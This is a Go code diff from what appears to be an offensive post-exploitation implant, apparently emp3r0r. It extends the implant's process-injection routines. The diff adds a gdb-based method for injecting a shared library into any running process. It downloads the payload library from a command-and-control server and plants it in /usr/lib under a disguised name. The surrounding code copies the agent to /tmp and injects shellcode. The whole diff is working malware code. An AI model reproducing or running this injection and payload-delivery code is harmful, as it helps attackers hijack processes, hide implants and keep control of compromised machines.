@@ -19,7 +19,7 @@ import (
 )
 
 // inject a shared library using dlopen
-func gdbInjectLoaderWorker(path_to_so string, pid int) error {
+func gdbInjectSharedLibWorker(path_to_so string, pid int) error {
 	gdb_path := RuntimeConfig.UtilsPath + "/gdb"
 	if !util.IsExist(gdb_path) {
 		res := VaccineHandler()
@@ -58,7 +58,7 @@ func gdbInjectLoaderWorker(path_to_so string, pid int) error {
 		path_to_so,
 		gdb_path,
 		pid)
-	out, err := exec.Command(RuntimeConfig.UtilsPath+"/bash", "-c", gdb_cmd).CombinedOutput()
+	out, err := exec.Command("sh", "-c", gdb_cmd).CombinedOutput()
 	if err != nil {
 		return fmt.Errorf("%s: %s\n%v", gdb_cmd, out, err)
 	}
@@ -72,7 +72,16 @@ func GDBInjectLoader(pid int) error {
 	if err != nil {
 		return err
 	}
-	return gdbInjectLoaderWorker(so_path, pid)
+	return gdbInjectSharedLibWorker(so_path, pid)
+}
+
+// Inject shared lib into any process
+func GDBInjectSharedLib(pid int) error {
+	so_path, err := prepare_shared_lib()
+	if err != nil {
+		return err
+	}
+	return gdbInjectSharedLibWorker(so_path, pid)
 }
 
 func prepare_inject_loader(pid int) (so_path string, err error) {
@@ -114,7 +123,7 @@ func prepare_guardian_sc(pid int) (shellcode string, err error) {
 }
 
 func prepare_shared_lib() (path string, err error) {
-	path = fmt.Sprintf("%s/libBLT.2.5.so.%d.so", RuntimeConfig.AgentRoot, util.RandInt(0, 100))
+	path = fmt.Sprintf("/usr/lib/libBLT.2.5.so.%d.so", util.RandInt(0, 100))
 	_, err = DownloadViaCC("to_inject.so", path)
 	if err != nil {
 		err = fmt.Errorf("Failed to download to_inject.so from CC: %v", err)
@@ -158,6 +167,14 @@ func InjectorHandler(pid int, method string) (err error) {
 				return
 			}
 		}
+
+	case "gdb_shared_lib":
+		so_path, e := prepare_shared_lib()
+		if e != nil {
+			return e
+		}
+		err = gdbInjectSharedLibWorker(so_path, pid)
+
 	case "inject_shellcode":
 		shellcode, _ := prepare_sc()
 		err = ShellcodeInjector(&shellcode, pid)
@@ -167,6 +184,7 @@ func InjectorHandler(pid int, method string) (err error) {
 
 		// restore original binary
 		err = CopyProcExeTo(pid, util.ProcExe(pid)) // as long as the process is still running
+
 	case "inject_loader":
 		err = CopySelfTo("/tmp/emp3r0r")
 		if err != nil {
@@ -182,7 +200,8 @@ func InjectorHandler(pid int, method string) (err error) {
 		if e != nil {
 			return e
 		}
-		err = InjectShardLib(so_path, pid)
+		err = InjectSharedLib(so_path, pid)
+
 	default:
 		err = fmt.Errorf("%s is not supported", method)
 	}
@@ -190,7 +209,7 @@ func InjectorHandler(pid int, method string) (err error) {
 }
 
 // inject a shared library into target process
-func InjectShardLib(so_path string, pid int) (err error) {
+func InjectSharedLib(so_path string, pid int) (err error) {
 	dlopen_addr := GetSymFromLibc(pid, "__libc_dlopen_mode")
 	if dlopen_addr == 0 {
 		return fmt.Errorf("failed to get __libc_dlopen_mode address for %d", pid)
@@ -210,5 +229,5 @@ func InjectLoader(pid int) error {
 		return err
 	}
 	defer os.RemoveAll("/tmp/emp3r0r") // in case we have this file remaining on disk
-	return InjectShardLib(so_path, pid)
+	return InjectSharedLib(so_path, pid)
 }
